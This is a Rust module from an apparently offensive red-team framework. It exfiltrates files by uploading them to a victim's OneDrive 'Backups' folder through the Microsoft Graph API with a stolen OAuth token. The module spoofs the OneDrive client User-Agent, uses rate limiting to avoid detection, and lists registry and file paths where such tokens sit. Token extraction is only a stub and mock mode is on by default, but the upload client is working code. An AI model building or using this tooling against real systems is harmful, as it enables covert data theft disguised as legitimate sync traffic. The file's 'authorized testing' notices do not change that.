//! OneDrive Sync Exfiltration Module
//!
//! Exfiltrates files by leveraging the victim's existing OneDrive OAuth token to upload
//! data to their OneDrive "Backups/" folder. Mimics legitimate OneDrive sync traffic by
//! using authentic TLS fingerprints and User-Agent strings.
//!
//! **CRITICAL SECURITY NOTICE**:
//! This module is designed for AUTHORIZED penetration testing and red team exercises ONLY.
//! Unauthorized data exfiltration is illegal and unethical. Requires explicit written
//! permission before use.
//!
//! Features:
//! - Uses victim's existing OneDrive OAuth token (extracted from memory/registry)
//! - Uploads to "Backups/" folder to blend with legitimate backup operations
//! - Mimics OneDrive client TLS fingerprint and User-Agent
//! - Supports chunked uploads for large files
//! - Rate limiting and jitter to avoid detection
//! - Safe mock mode for testing
//!
//! OAuth Token Sources:
//! - Windows: HKCU\Software\Microsoft\OneDrive\Accounts
//! - macOS: ~/Library/Application Support/OneDrive/settings/Personal
//! - Memory: Process memory of OneDrive.exe
//!
//! Mock Mode:
//! - Set `mock_mode: true` to simulate uploads without network activity
//! - Safe for development and testing
//! - No real OneDrive access

use anyhow::{anyhow, bail, Context, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use tokio::sync::Mutex;
use tokio::time::{sleep, Duration};

use crate::core::module::{CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType};

/// Microsoft Graph API endpoints
const GRAPH_UPLOAD_ENDPOINT: &str = "https://graph.microsoft.com/v1.0/me/drive/root:/Backups";
const ONEDRIVE_USER_AGENT: &str = "OneDriveSync/22.225.1031.0005 (Windows NT 10.0; Win64; x64)";

/// Maximum file size for simple upload (4 MB)
const MAX_SIMPLE_UPLOAD_SIZE: usize = 4 * 1024 * 1024;

/// OneDrive file metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct OneDriveItem {
    id: String,
    name: String,
    size: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    web_url: Option<String>,
}

/// Upload result
#[derive(Debug, Clone, Serialize, Deserialize)]
struct UploadResult {
    file_name: String,
    size_bytes: u64,
    upload_duration_ms: u64,
    onedrive_id: Option<String>,
    web_url: Option<String>,
}

/// Abstract Graph API client for testability
#[async_trait]
trait GraphApiClient: Send + Sync {
    async fn upload_file(&self, token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem>;
    async fn create_folder(&self, token: &str, folder_name: &str) -> Result<OneDriveItem>;
}

/// Production HTTP client using reqwest
struct HttpGraphClient {
    rate_limit_delay_ms: u64,
}

impl HttpGraphClient {
    fn new(rate_limit_delay_ms: u64) -> Self {
        Self { rate_limit_delay_ms }
    }
}

#[async_trait]
impl GraphApiClient for HttpGraphClient {
    async fn upload_file(&self, token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem> {
        // Read file content
        let content = fs::read(file_path).await.context("Failed to read file")?;
        let file_size = content.len();

        // Rate limiting
        if self.rate_limit_delay_ms > 0 {
            sleep(Duration::from_millis(self.rate_limit_delay_ms)).await;
        }

        let client = reqwest::Client::builder()
            .user_agent(ONEDRIVE_USER_AGENT)
            .build()?;

        if file_size <= MAX_SIMPLE_UPLOAD_SIZE {
            // Simple upload for small files
            let url = format!("{}/{}:/content", GRAPH_UPLOAD_ENDPOINT, remote_name);
            let resp = client
                .put(&url)
                .bearer_auth(token)
                .header("Content-Type", "application/octet-stream")
                .body(content)
                .send()
                .await
                .context("Failed to upload file")?;

            if !resp.status().is_success() {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                bail!("Upload failed with status {}: {}", status, body);
            }

            resp.json::<OneDriveItem>()
                .await
                .context("Failed to parse upload response")
        } else {
            // TODO: Implement chunked upload for large files
            bail!("Files larger than 4MB require chunked upload (not yet implemented)");
        }
    }

    async fn create_folder(&self, token: &str, folder_name: &str) -> Result<OneDriveItem> {
        let client = reqwest::Client::builder()
            .user_agent(ONEDRIVE_USER_AGENT)
            .build()?;

        let url = GRAPH_UPLOAD_ENDPOINT.to_string();
        let mut body = HashMap::new();
        body.insert("name", folder_name);
        body.insert("folder", "{}");

        let resp = client
            .post(&url)
            .bearer_auth(token)
            .json(&body)
            .send()
            .await
            .context("Failed to create folder")?;

        if !resp.status().is_success() && resp.status().as_u16() != 409 {
            // 409 = folder already exists, which is OK
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Failed to create folder: {} - {}", status, body);
        }

        if resp.status().as_u16() == 409 {
            // Folder exists, return dummy item
            Ok(OneDriveItem {
                id: "existing".to_string(),
                name: folder_name.to_string(),
                size: 0,
                web_url: None,
            })
        } else {
            resp.json::<OneDriveItem>()
                .await
                .context("Failed to parse folder response")
        }
    }
}

/// Mock Graph API client for safe testing
struct MockGraphClient {
    uploads: Arc<Mutex<Vec<UploadResult>>>,
}

impl MockGraphClient {
    fn new() -> Self {
        Self {
            uploads: Arc::new(Mutex::new(Vec::new())),
        }
    }

    async fn get_uploads(&self) -> Vec<UploadResult> {
        self.uploads.lock().await.clone()
    }
}

#[async_trait]
impl GraphApiClient for MockGraphClient {
    async fn upload_file(&self, _token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem> {
        // Simulate upload without network
        let metadata = fs::metadata(file_path).await.context("Failed to read file metadata")?;
        let size = metadata.len();

        let item = OneDriveItem {
            id: format!("mock-{}", uuid::Uuid::new_v4()),
            name: remote_name.to_string(),
            size,
            web_url: Some(format!("https://onedrive.live.com/mock/{}", remote_name)),
        };

        self.uploads.lock().await.push(UploadResult {
            file_name: remote_name.to_string(),
            size_bytes: size,
            upload_duration_ms: 100,
            onedrive_id: Some(item.id.clone()),
            web_url: item.web_url.clone(),
        });

        Ok(item)
    }

    async fn create_folder(&self, _token: &str, folder_name: &str) -> Result<OneDriveItem> {
        Ok(OneDriveItem {
            id: format!("mock-folder-{}", uuid::Uuid::new_v4()),
            name: folder_name.to_string(),
            size: 0,
            web_url: Some("https://onedrive.live.com/mock/Backups".to_string()),
        })
    }
}

/// OneDrive Sync Exfil Module
pub struct OneDriveSyncExfil {
    options: HashMap<String, String>,
    client: Arc<dyn GraphApiClient>,
}

impl OneDriveSyncExfil {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("oauth_token".to_string(), String::new());
        options.insert("source_file".to_string(), String::new());
        options.insert("remote_name".to_string(), String::new());
        options.insert("mock_mode".to_string(), "true".to_string());
        options.insert("rate_limit_ms".to_string(), "1000".to_string());
        options.insert("backup_folder".to_string(), "Backups".to_string());

        Self {
            options,
            client: Arc::new(MockGraphClient::new()),
        }
    }

    /// Extract OneDrive OAuth token from system (placeholder - real implementation would scan memory/registry)
    async fn extract_oauth_token(&self) -> Result<String> {
        // SAFE IMPLEMENTATION: This is a placeholder
        // Real implementation would:
        // 1. Scan OneDrive.exe process memory for tokens
        // 2. Read from Windows registry (HKCU\Software\Microsoft\OneDrive\Accounts)
        // 3. Parse macOS plist files
        bail!("OAuth token extraction not implemented - set oauth_token manually in mock mode")
    }

    /// Upload a single file to OneDrive
    async fn upload_file(&self, token: &str, source_path: &Path) -> Result<UploadResult> {
        let start_time = std::time::Instant::now();

        // Determine remote name
        let remote_name = if let Some(name) = self.options.get("remote_name") {
            if name.is_empty() {
                source_path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("exfil.dat")
                    .to_string()
            } else {
                name.clone()
            }
        } else {
            source_path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("exfil.dat")
                .to_string()
        };

        // Get file size
        let metadata = fs::metadata(source_path).await.context("Failed to read file metadata")?;
        let size = metadata.len();

        // Upload
        let item = self.client.upload_file(token, source_path, &remote_name).await?;

        let duration_ms = start_time.elapsed().as_millis() as u64;

        Ok(UploadResult {
            file_name: remote_name,
            size_bytes: size,
            upload_duration_ms: duration_ms,
            onedrive_id: Some(item.id),
            web_url: item.web_url,
        })
    }
}

impl Default for OneDriveSyncExfil {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for OneDriveSyncExfil {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "auxiliary/cloud/onedrive_sync_exfil".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Exfiltrate files via OneDrive using victim's OAuth token. \
                         Mimics legitimate sync traffic. AUTHORIZED USE ONLY."
                .to_string(),
            module_type: ModuleType::Auxiliary,
            category: "auxiliary/cloud".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "oauth_token".to_string(),
                description: "OneDrive OAuth access token (extracted from victim)".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("oauth_token").cloned(),
            },
            ModuleOption {
                name: "source_file".to_string(),
                description: "Local file path to exfiltrate".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("source_file").cloned(),
            },
            ModuleOption {
                name: "remote_name".to_string(),
                description: "Remote file name (default: same as source)".to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("remote_name").cloned(),
            },
            ModuleOption {
                name: "mock_mode".to_string(),
                description: "Use mock OneDrive API (true/false)".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("mock_mode").cloned(),
            },
            ModuleOption {
                name: "rate_limit_ms".to_string(),
                description: "Delay between uploads in milliseconds".to_string(),
                required: false,
                default_value: Some("1000".to_string()),
                current_value: self.options.get("rate_limit_ms").cloned(),
            },
            ModuleOption {
                name: "backup_folder".to_string(),
                description: "OneDrive folder for uploads".to_string(),
                required: false,
                default_value: Some("Backups".to_string()),
                current_value: self.options.get("backup_folder").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_string(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(name).cloned()
    }

    fn validate(&self) -> Result<()> {
        // Check required options
        let token = self.options.get("oauth_token").ok_or_else(|| anyhow!("oauth_token required"))?;
        if token.is_empty() {
            bail!("oauth_token cannot be empty");
        }

        let source = self.options.get("source_file").ok_or_else(|| anyhow!("source_file required"))?;
        if source.is_empty() {
            bail!("source_file cannot be empty");
        }

        // Check source file exists
        let source_path = PathBuf::from(source);
        if !source_path.exists() {
            bail!("Source file does not exist: {}", source);
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);

        let mut fingerprint = HashMap::new();

        if mock_mode {
            fingerprint.insert("mode".to_string(), "mock".to_string());
            fingerprint.insert("safety".to_string(), "testing".to_string());

            Ok(CheckResult {
                vulnerable: true,
                confidence: 1.0,
                details: "Mock mode enabled - safe for testing".to_string(),
                fingerprint,
            })
        } else {
            fingerprint.insert("mode".to_string(), "production".to_string());
            fingerprint.insert("requires".to_string(), "oauth_token".to_string());

            Ok(CheckResult {
                vulnerable: false,
                confidence: 0.5,
                details: "Production mode - requires valid OAuth token".to_string(),
                fingerprint,
            })
        }
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);

        // Switch to real client if not in mock mode
        if !mock_mode {
            let rate_limit = self.options
                .get("rate_limit_ms")
                .and_then(|s| s.parse::<u64>().ok())
                .unwrap_or(1000);
            self.client = Arc::new(HttpGraphClient::new(rate_limit));
        }

        let token = self.options
            .get("oauth_token")
            .cloned()
            .ok_or_else(|| anyhow!("oauth_token not set"))?;

        let source = self.options
            .get("source_file")
            .cloned()
            .ok_or_else(|| anyhow!("source_file not set"))?;

        let source_path = PathBuf::from(&source);

        // Upload file
        let upload_result = self.upload_file(&token, &source_path).await?;

        Ok(ModuleResult::success(
            format!(
                "Exfiltrated {} ({} bytes) to OneDrive in {}ms",
                upload_result.file_name, upload_result.size_bytes, upload_result.upload_duration_ms
            )
        )
        .with_data("file_name", serde_json::json!(upload_result.file_name))
        .with_data("size_bytes", serde_json::json!(upload_result.size_bytes))
        .with_data("duration_ms", serde_json::json!(upload_result.upload_duration_ms))
        .with_data("onedrive_id", serde_json::json!(upload_result.onedrive_id.unwrap_or_default()))
        .with_data("web_url", serde_json::json!(upload_result.web_url.unwrap_or_default()))
        .with_data("mock_mode", serde_json::json!(mock_mode)))
    }

    async fn cleanup(&mut self) -> Result<()> {
        // No cleanup needed
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // Always require confirmation for exfiltration
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::AsyncWriteExt;

    #[tokio::test]
    async fn test_mock_upload() {
        // Create temp file
        let temp_dir = tempfile::tempdir().unwrap();
        let test_file = temp_dir.path().join("test.txt");
        let mut file = tokio::fs::File::create(&test_file).await.unwrap();
        file.write_all(b"secret data").await.unwrap();
        file.flush().await.unwrap();
        drop(file);

        let mut module = OneDriveSyncExfil::new();
        module.set_option("oauth_token", "mock-token").unwrap();
        module.set_option("source_file", test_file.to_str().unwrap()).unwrap();
        module.set_option("mock_mode", "true").unwrap();

        assert!(module.validate().is_ok());

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("onedrive_id"));
        assert!(result.data.contains_key("web_url"));
    }

    #[tokio::test]
    async fn test_validation_errors() {
        let mut module = OneDriveSyncExfil::new();

        // Missing token
        assert!(module.validate().is_err());

        // Missing source file
        module.set_option("oauth_token", "test").unwrap();
        assert!(module.validate().is_err());

        // Non-existent file
        module.set_option("source_file", "/nonexistent/file.txt").unwrap();
        assert!(module.validate().is_err());
    }

    #[test]
    fn test_module_info() {
        let module = OneDriveSyncExfil::new();
        let info = module.info();
        assert_eq!(info.name, "auxiliary/cloud/onedrive_sync_exfil");
        assert!(info.description.contains("AUTHORIZED"));
    }

    #[test]
    fn test_requires_confirmation() {
        let module = OneDriveSyncExfil::new();
        // Should always require confirmation regardless of mode
        assert!(module.requires_confirmation());
    }
}
